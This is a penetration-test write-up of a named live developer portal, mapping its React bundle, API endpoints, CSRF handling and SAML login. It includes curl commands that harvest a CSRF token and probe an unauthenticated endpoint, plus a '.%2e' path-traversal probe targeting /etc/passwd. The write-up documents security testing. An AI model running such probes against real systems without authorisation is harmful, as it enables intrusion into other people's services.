# Case Study: developer.verisign.com/devhub/ — React SPA Pentest

Real-world pentest of a Spring+Thymeleaf app with SAML SSO, React frontend, Axios API client, and reCAPTCHA-protected registration form. Demonstrates the full webpack chunk analysis workflow and several cross-cutting findings.

## Target Architecture

- **Backend**: Spring + Thymeleaf (Spring4 DTD), Apache reverse proxy
- **Frontend**: React SPA (webpack chunked: runtime.js, vendor.js, request.js, thirdparty.js)
- **HTTP Client**: Axios v1.19.0, baseURL `/devhub`, CSRF via meta tag → X-XSRF-TOKEN header
- **Auth**: SAML 2.0 SSO via login.verisign.com (IdP: `devhub_prod_ext_b`)
- **CSRF**: Double-submit cookie (XSRF-TOKEN cookie UUID + meta tag Spring CSRF token)
- **reCAPTCHA**: Google reCAPTCHA v2, site key in meta tag, token sent as `captchaResponse` in POST body
- **Cookie Consent**: OneTrust (domain script: `5317ed92-2e8e-4c78-a54c-94785b17d538`)
- **CSP**: nonce-based `script-src 'strict-dynamic'`, `object-src 'none'`

## JS File Analysis

### Webpack chunk structure

```
runtime.js      2.4KB   — webpack runtime, module loader
vendor.js       1.7MB   — React, MUI, Axios, reCAPTCHA, OneTrust SDK
request.js       20KB   — page-specific: registration form, API calls, validation
thirdparty.js   693B    — OneTrust cookie consent loader
error.js         4.3KB  — error page renderer
```

Each chunk pushes into `webpackChunkreact_html`:
```javascript
(self.webpackChunkreact_html = self.webpackChunkreact_html || []).push([[14], {184(e,t,a){...}}])
```

### Module map (request.js)

| Module ID | Purpose | Key finding |
|-----------|---------|-------------|
| 8611 | Axios HTTP client config | `baseURL:"/devhub"`, CSRF from meta tag, 401 interceptor |
| 17 | Registration form component | Form state, validation, submit handler, innerHTML error sink |
| 184 | API service functions | All REST endpoint definitions |
| 453 | Meta tag reader | `document.querySelector('meta[name="X"]')` utility |
| 8475 | Config constants | VCMS file paths, US state list, API guide IDs |
| 1186 | Country autocomplete | Fetches `/rest/pub/countries`, hardcoded fallback |
| 2284 | Layout component | Navigation tabs, calls `/rest/accountproducts/navigation` |

### API endpoints extracted from JS

```javascript
// Module 184 — API service functions
GET  /rest/accountproducts/navigation          // Nav tabs (auth required)
GET  /rest/accountproducts/${id}/keys           // List API keys (auth)
POST /rest/accountproducts/${id}/keys           // Create key (auth)
PUT  /rest/accountproducts/${id}/keys/${keyId}  // Update key (auth)
DELETE /rest/accountproducts/${id}/keys/${keyId} // Delete key (auth)
GET  /rest/accountproducts/${id}/permissions    // Permissions (auth)
GET  /rest/accountproducts/${id}/agreements     // Agreements (auth)
GET  /rest/accountproducts/${id}/key/${keyId}/config // Key config (auth)

// Module 17 — Registration form
POST /rest/pub/accountrequests                  // Submit registration (public)
PUT  /rest/pub/accountrequests/${id}/feedback  // Submit feedback (public)

// Module 1186 — Country autocomplete
GET  /rest/pub/countries                       // Country list (public)

// Module 8475 — VCMS file paths (auth required)
GET  /devhub/vcms/v1/developer/files/${id}     // Content management files
```

### Axios configuration (module 8611)

```javascript
const o = getMetaContent("_csrf");        // Spring CSRF token from meta tag
const i = getMetaContent("_csrf_header"); // "X-XSRF-TOKEN"
const c = axios.create({
    baseURL: "/devhub",
    headers: {
        "Content-Type": "application/json",
        [i]: o                           // X-XSRF-TOKEN: {csrf_token}
    }
});
// 401 interceptor: throws "Your session has expired"
```

### innerHTML XSS sink (module 17, error handler)

```javascript
// Error catch block in registration form submit:
const t = document.createElement("html");
t.innerHTML = e.response.data;  // ← DOM-based XSS sink
const n = t.querySelector('meta[name~="errorMessage"]');
const r = n ? n.getAttribute("content") : "We are unable to connect...";
```

**Mitigation**: CSP `script-src 'nonce-...' 'strict-dynamic'` prevents script execution from innerHTML. Non-script HTML injection (img, svg, CSS) may still work. Classified as LOW.

### OneTrust hostname check (thirdparty.js)

```javascript
// If hostname doesn't match production, loads test OneTrust config
location.hostname != 'developer.verisign.com'  // appends '-test' to script ID
// Script ID: 5317ed92-2e8e-4c78-a54c-94785b17d538 → -test variant
```

## Key Findings

### 1. Information Disclosure via Unauthenticated Feedback Endpoint (MEDIUM)

`PUT /devhub/rest/pub/accountrequests/{id}/feedback` is unauthenticated (only needs valid CSRF token from any page). Error message leaks internal data structure:

```bash
# Step 1: Get CSRF token
CSRF=$(curl -s "https://developer.verisign.com/devhub/request" \
  -H "User-Agent: Mozilla/5.0" -H "X-XSRF-TOKEN: test" \
  -c /tmp/cookies.txt | grep -oP '_csrf" content="\K[^"]+')

# Step 2: Send feedback request
curl -s "https://developer.verisign.com/devhub/rest/pub/accountrequests/1/feedback" \
  -X PUT \
  -H "Content-Type: application/json" \
  -H "X-XSRF-TOKEN: $CSRF" \
  -b /tmp/cookies.txt \
  -d '{"starResponse":5,"comments":"test","accountRequestId":"1","emailHash":"test"}'
# Response: "no account request found for account request id: 1and emailhash: test"
```

The missing space before "and" suggests SQL/ORM string concatenation in error message construction. Reveals `accountRequestId` and `emailHash` as lookup keys. Only leaks on first request with fresh session — subsequent requests return generic error.

### 2. SAML RelayState Path Reflection (LOW-MEDIUM)

Spring+Thymeleaf SAML SP reflects requested URL path in RelayState after normalization. Path traversal via `.%2e` bypasses `..` blocking:

```bash
curl -s "https://developer.verisign.com/devhub/vcms/v1/developer/files/.%2e/.%2e/.%2e/.%2e/etc/passwd" \
  | grep -oP 'RelayState" value="\K[^"]+'
# Returns: /etc/passwd
```

Cannot redirect to external domains (URLs normalized to paths). Could redirect authenticated users to arbitrary internal paths post-SSO.

### 3. SAML SSO Catch-All False Positive Pattern

ALL paths on this SAML-protected Spring Boot app return HTTP 200 with SAML redirect HTML. This creates false positives for:
- Spring Boot Actuator endpoints (`/actuator/health` → 200 but is SAML redirect, not `{"status":"UP"}`)
- Any endpoint enumeration (everything returns 200)

**Detection**: Compare response body. SAML redirect ~3,950 bytes with `<form action="...SAML2/SSO/POST"`. Real 401 JSON ~126 bytes with `{"status":401}`. Use size comparison:

```bash
SIZE1=$(curl -s -o /dev/null -w "%{size_download}" "https://$TARGET/actuator")
SIZE2=$(curl -s -o /dev/null -w "%{size_download}" "https://$TARGET/actuator/xyz-does-not-exist")
# If SIZE1 == SIZE2, it's the SAML catch-all
```

### 4. reCAPTCHA Server-Side Validation (NOT BYPASSABLE)

All four bypass attempts returned HTTP 400:
- Empty `captchaResponse: ""` → 400
- Fake token `"FAKE_TOKEN_12345"` → 400
- Null `captchaResponse: null` → 400
- Omitted field → 400

Server-side reCAPTCHA validation is enforced. Client-side `recaptchaValidate` meta tag always `"true"`.

## Registration Form Data Structure

POST to `/devhub/rest/pub/accountrequests`:
```json
{
  "productIdList": [545],
  "captchaResponse": "<reCAPTCHA token>",
  "accountRequest": {
    "firstName": "", "lastName": "", "phoneNumber": "+1.XXX.XXXXXXX",
    "email": "", "address": "", "address2": "", "city": "",
    "companyName": "", "country": "", "postalCode": "", "state": ""
  }
}
```

Success response: `{accountRequestId, emailHash}` — used for feedback flow.

## Security Headers

Present: HSTS (preload), X-Content-Type-Options, X-Frame-Options (DENY/SAMEORIGIN), CSP (nonce+strict-dynamic), Cache-Control, Secure+HttpOnly cookies.
Missing: Referrer-Policy, Permissions-Policy.

## Vendor.js Analysis

- Axios version: 1.19.0 (check for known CVEs)
- Prototype pollution guards present: `"__proto__"===i||"constructor"===i||"prototype"===i` in merge functions
- 15 `dangerouslySetInnerHTML` usages (React's escape hatch) — all in React's internal DOM rendering, not user-controlled
- 8 `.innerHTML` usages — React internals, not direct sinks
- No eval/Function() found in vendor code
- reCAPTCHA component: react-recaptcha with `getResponse`, `execute`, `widgetId` methods
